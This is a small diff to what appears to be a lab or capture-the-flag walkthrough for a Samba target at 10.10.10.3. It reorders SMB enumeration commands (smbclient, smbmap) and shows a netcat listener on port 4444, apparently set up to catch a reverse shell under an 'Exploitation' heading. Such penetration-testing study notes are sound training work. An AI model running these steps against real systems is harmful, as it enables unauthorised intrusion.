@@ -27,14 +27,14 @@ ls /usr/share/nmap/scripts/ssh*
 ```
 smbclient -L 10.10.10.3
 ```
+```
+smbmap -H 10.10.10.3
+```
 
 #   Exploitation #1: Samba
 
 ```
 nc -nlvp 4444
-```
-```
-smbmap -H 10.10.10.3
 ```
 ```
 smbclient //10.10.10.3/tmp
